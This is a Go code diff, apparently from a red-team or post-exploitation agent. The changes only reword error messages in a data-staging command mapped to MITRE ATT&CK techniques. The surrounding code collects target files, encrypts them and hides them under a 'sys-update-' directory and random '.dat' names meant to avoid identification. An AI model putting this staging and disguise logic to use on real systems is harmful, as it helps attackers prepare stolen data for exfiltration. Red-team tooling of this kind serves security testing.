@@ -23,16 +23,16 @@ import (
 // MITRE ATT&CK: T1074.001 (Local Data Staging), T1560.001 (Archive via Utility)
 func compressStage(task structs.Task, params CompressParams) structs.CommandResult {
 	if params.Path == "" {
-		return errorResult("Error: 'path' is required for stage action")
+		return errorResult("'path' is required for stage action")
 	}
 
 	srcPath, err := filepath.Abs(params.Path)
 	if err != nil {
-		return errorf("Error resolving path: %v", err)
+		return errorf("resolving path: %v", err)
 	}
 
 	if _, err := os.Stat(srcPath); err != nil {
-		return errorf("Error accessing source: %v", err)
+		return errorf("accessing source: %v", err)
 	}
 
 	// Create staging directory
@@ -40,22 +40,22 @@ func compressStage(task structs.Task, params CompressParams) structs.CommandResu
 	if stagingDir == "" {
 		stagingDir, err = os.MkdirTemp("", "sys-update-")
 		if err != nil {
-			return errorf("Error creating staging directory: %v", err)
+			return errorf("creating staging directory: %v", err)
 		}
 	} else {
 		stagingDir, err = filepath.Abs(stagingDir)
 		if err != nil {
-			return errorf("Error resolving staging path: %v", err)
+			return errorf("resolving staging path: %v", err)
 		}
 		if mkErr := os.MkdirAll(stagingDir, 0700); mkErr != nil {
-			return errorf("Error creating staging directory: %v", mkErr)
+			return errorf("creating staging directory: %v", mkErr)
 		}
 	}
 
 	// Generate random archive name to avoid identification
 	randBytes := make([]byte, 8)
 	if _, err := rand.Read(randBytes); err != nil {
-		return errorf("Error generating random name: %v", err)
+		return errorf("generating random name: %v", err)
 	}
 	archiveName := hex.EncodeToString(randBytes) + ".dat"
 	archivePath := filepath.Join(stagingDir, archiveName)
@@ -72,12 +72,12 @@ func compressStage(task structs.Task, params CompressParams) structs.CommandResu
 	// Step 2: Encrypt the zip archive with AES-256-GCM
 	key := make([]byte, 32) // AES-256
 	if _, err := rand.Read(key); err != nil {
-		return errorf("Error generating encryption key: %v", err)
+		return errorf("generating encryption key: %v", err)
 	}
 
 	plaintext, err := os.ReadFile(tmpZipPath)
 	if err != nil {
-		return errorf("Error reading archive for encryption: %v", err)
+		return errorf("reading archive for encryption: %v", err)
 	}
 
 	// Compute SHA-256 hash of plaintext for integrity verification
@@ -85,12 +85,12 @@ func compressStage(task structs.Task, params CompressParams) structs.CommandResu
 
 	ciphertext, err := encryptAESGCM(key, plaintext)
 	if err != nil {
-		return errorf("Error encrypting archive: %v", err)
+		return errorf("encrypting archive: %v", err)
 	}
 
 	// Write encrypted archive
 	if err := os.WriteFile(archivePath, ciphertext, 0600); err != nil {
-		return errorf("Error writing encrypted archive: %v", err)
+		return errorf("writing encrypted archive: %v", err)
 	}
 
 	// Build staging metadata
@@ -107,7 +107,7 @@ func compressStage(task structs.Task, params CompressParams) structs.CommandResu
 
 	metadataJSON, err := json.Marshal(metadata)
 	if err != nil {
-		return errorf("Error: failed to marshal result: %v", err)
+		return errorf("failed to marshal result: %v", err)
 	}
 
 	return structs.CommandResult{
@@ -122,7 +122,7 @@ func compressStage(task structs.Task, params CompressParams) structs.CommandResu
 func compressStageCollectFiles(task structs.Task, srcPath, stagingDir string, params CompressParams) (string, int, int64, *structs.CommandResult) {
 	tmpZip, err := os.CreateTemp(stagingDir, ".tmp-")
 	if err != nil {
-		r := errorf("Error creating temp file: %v", err)
+		r := errorf("creating temp file: %v", err)
 		return "", 0, 0, &r
 	}
 	tmpZipPath := tmpZip.Name()
@@ -188,12 +188,12 @@ func compressStageCollectFiles(task structs.Task, srcPath, stagingDir string, pa
 
 	if err != nil {
 		tmpZip.Close()
-		r := errorf("Error collecting files: %v", err)
+		r := errorf("collecting files: %v", err)
 		return tmpZipPath, 0, 0, &r
 	}
 	if closeErr := zipWriter.Close(); closeErr != nil {
 		tmpZip.Close()
-		r := errorf("Error finalizing archive: %v", closeErr)
+		r := errorf("finalizing archive: %v", closeErr)
 		return tmpZipPath, 0, 0, &r
 	}
 	tmpZip.Close()
